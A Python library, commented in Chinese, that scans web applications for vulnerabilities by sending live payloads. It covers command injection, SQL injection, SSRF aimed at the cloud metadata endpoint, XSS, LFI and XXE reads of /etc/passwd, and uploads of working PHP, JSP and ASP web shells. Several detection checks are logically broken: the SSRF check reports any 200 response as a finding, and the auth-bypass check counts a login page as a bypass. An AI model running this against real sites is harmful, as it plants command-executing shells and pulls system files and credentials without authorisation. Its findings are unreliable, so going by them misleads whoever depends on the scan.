#!/usr/bin/env python3
"""
Web 漏洞检测工具函数库
提供: 命令注入、SQL注入、SSRF、XSS、文件读取、认证绕过 等通用检测函数
"""
import urllib.request, urllib.parse, ssl, socket, concurrent.futures, time

# ============ 基础 HTTP 工具 ============

def http_get(url, headers=None, timeout=15):
    """发送 GET 请求"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers=headers or {})
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return {"status": resp.getcode(), "headers": dict(resp.headers), "body": resp.read()}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "error": e.read().decode(errors='ignore')}
    except Exception as ex:
        return {"error": str(ex)}

def http_post(url, data, headers=None, timeout=15):
    """发送 POST 请求"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        body = data.encode() if isinstance(data, str) else data
        req = urllib.request.Request(url, data=body, headers=headers or {}, method="POST")
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return {"status": resp.getcode(), "body": resp.read()}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "error": e.read().decode(errors='ignore')}
    except Exception as ex:
        return {"error": str(ex)}

# ============ 命令注入检测 ============

COMMAND_INJECTION_PAYLOADS = [
    "| whoami",
    "; whoami",
    "& whoami",
    "`whoami`",
    "$(whoami)",
    "|| curl http://",
    "&& ping -c 1",
    "| id",
    "; id",
]

def detect_cmd_injection(url, param="q", method="GET") -> bool:
    """检测命令注入漏洞（盲测：注入延迟命令）"""
    delay = 5
    base_url = url.split('?')[0]
    for p in COMMAND_INJECTION_PAYLOADS:
        try:
            if method == "GET":
                target = f"{base_url}?{param}={urllib.parse.quote(p)}"
                result = http_get(target)
            else:
                result = http_post(url, {param: p})
            # 盲测：注入 sleep
            sleep_payload = f"; sleep {delay}"
            start = time.time()
            if method == "GET":
                http_get(f"{base_url}?{param}={urllib.parse.quote(sleep_payload)}")
            else:
                http_post(url, {param: sleep_payload})
            elapsed = time.time() - start
            if elapsed >= delay - 1:
                return True
        except:
            pass
    return False

# ============ SQL 注入检测 ============

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' AND '1'='1",
    "1' UNION SELECT NULL--",
    "' WAITFOR DELAY '0:0:5'--",
    "admin'--",
    "' OR 1=1--",
]

def detect_sqli(url, param="id", method="GET") -> bool:
    """检测 SQL 注入漏洞"""
    for p in SQLI_PAYLOADS:
        try:
            if method == "GET":
                target = f"{url.split('?')[0]}?{param}={urllib.parse.quote(p)}"
                resp = http_get(target)
            else:
                resp = http_post(url, {param: p})
            body = str(resp.get("body", ""))
            # 常见 SQL 错误特征
            sql_errors = [
                "sql syntax", "mysql_fetch", "ora-", "pg_query",
                "syntax error", "unterminated", "sqlstate",
                "warning: mysql", "microsoft sql native error"
            ]
            for err in sql_errors:
                if err.lower() in body.lower():
                    return True
            # 延迟检测
            if "WAITFOR" in p.upper() or "sleep" in p.lower():
                start = time.time()
                if method == "GET":
                    http_get(target)
                else:
                    http_post(url, {param: p})
                if time.time() - start >= 4:
                    return True
        except:
            pass
    return False

# ============ SSRF 检测 ============

def detect_ssrf(url, param="url", internal_ip="127.0.0.1") -> bool:
    """检测 SSRF 漏洞"""
    ssrf_payloads = [
        f"http://{internal_ip}",
        f"http://169.254.169.254/latest/meta-data/",
        f"http://localhost/",
        f"file:///etc/passwd",
    ]
    for p in ssrf_payloads:
        try:
            encoded = urllib.parse.quote(p)
            target = f"{url.split('?')[0]}?{param}={encoded}"
            resp = http_get(target)
            body = str(resp.get("body", ""))
            status = resp.get("status", 0)
            # 检测响应中是否包含内网内容
            if "root:" in body or status == 200:
                return True
            # 检测元数据
            if "ami-id" in body or "aws" in body.lower():
                return True
        except:
            pass
    return False

# ============ XSS 检测 ============

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
]

def detect_xss(url, param="q", method="GET") -> bool:
    """检测 XSS 漏洞（简单反射检测）"""
    for p in XSS_PAYLOADS:
        try:
            if method == "GET":
                target = f"{url.split('?')[0]}?{param}={urllib.parse.quote(p)}"
                resp = http_get(target)
            else:
                resp = http_post(url, {param: p})
            body = str(resp.get("body", ""))
            # 检查 payload 是否被反射且未转义
            if p in body and "<script" not in body.lower():
                # 更严格的检测：确保在 HTML 上下文中
                idx = body.find(p)
                if idx >= 0:
                    before = body[max(0, idx-10):idx]
                    after = body[idx+len(p):idx+len(p)+10]
                    if not all(c in "&<>" for c in before.strip()[-5:]):
                        return True
        except:
            pass
    return False

# ============ 任意文件读取检测 ============

def detect_lfi(url, param="file", paths=None) -> dict:
    """检测 LFI 漏洞，返回成功读取的文件"""
    if paths is None:
        paths = [
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "C:\\boot.ini",
            "../../../../../../etc/passwd",
            "....//....//....//....//....//etc/passwd",
            "/proc/self/environ",
            "/var/log/auth.log",
        ]
    base_url = url.split('?')[0]
    found = []
    for path in paths:
        try:
            target = f"{base_url}?{param}={urllib.parse.quote(path)}"
            resp = http_get(target)
            body = resp.get("body", b"").decode('utf-8', errors='ignore')
            if "root:" in body and "/bin/" in body:
                found.append(path)
            elif ":]" in body or "[boot loader]" in body:
                found.append(path)
        except:
            pass
    return found

# ============ 认证绕过检测 ============

def detect_auth_bypass(url) -> bool:
    """检测认证绕过（常见端点）"""
    admin_paths = [
        "/admin/",
        "/admin.php",
        "/administrator/",
        "/wp-admin/",
        "/manage/",
        "/management/",
        "/api/admin/",
        "/dashboard/",
        "/internal/",
    ]
    base = url.rstrip('/')
    for path in admin_paths:
        try:
            resp = http_get(base + path)
            if resp.get("status") == 200:
                body = str(resp.get("body", b""))
                if "password" in body.lower() or "login" in body.lower() or "admin" in body.lower():
                    # 成功进入管理后台（无重定向）
                    return True
        except:
            pass
    return False

# ============ 文件上传检测 ============

UPLOAD_PAYLOADS = [
    ("shell.php", "<?php system($_GET['c']); ?>", "application/x-php"),
    ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter('c')); %>", "application/x-java-erialized"),
    ("shell.asp", "<% eval request('c') %>", "application/x-asp"),
]

def detect_upload(url, field="file") -> list:
    """检测任意文件上传漏洞"""
    results = []
    for filename, content, ctype in UPLOAD_PAYLOADS:
        try:
            import email.mime.multipart
            boundary = "----WebKitFormBoundary"
            body = f"--{boundary}\r\n"
            body += f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            body += f"Content-Type: {ctype}\r\n\r\n"
            body += content + "\r\n"
            body += f"--{boundary}--\r\n"
            headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
            resp = http_post(url, body, headers)
            if resp.get("status") in (200, 201, 204):
                results.append(filename)
        except:
            pass
    return results

# ============ XXE 检测 ============

XXE_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

def detect_xxe(url, param_name="xml") -> bool:
    """检测 XXE 漏洞"""
    try:
        headers = {"Content-Type": "application/xml"}
        resp = http_post(url, XXE_PAYLOAD, headers)
        body = str(resp.get("body", b""))
        if "root:" in body and "/bin/" in body:
            return True
    except:
        pass
    return False

# ============ IDOR 检测 ============

def detect_idor(url_pattern, param="id") -> bool:
    """检测 IDOR（需要两个不同ID测试访问控制）"""
    # 示例: /api/user?id=1 和 /api/user?id=2
    base = url_pattern.split('?')[0]
    try:
        r1 = http_get(f"{base}?{param}=1")
        r2 = http_get(f"{base}?{param}=999999")
        b1 = str(r1.get("body", b""))
        b2 = str(r2.get("body", b""))
        # 两者内容不同但都返回 200，可能存在 IDOR
        if r1.get("status") == 200 and r2.get("status") == 200 and b1 != b2:
            return True
    except:
        pass
    return False

if __name__ == "__main__":
    print("utils.http - Web 漏洞检测工具库")
    print("Usage: from utils.http import detect_cmd_injection, detect_sqli, ... ")
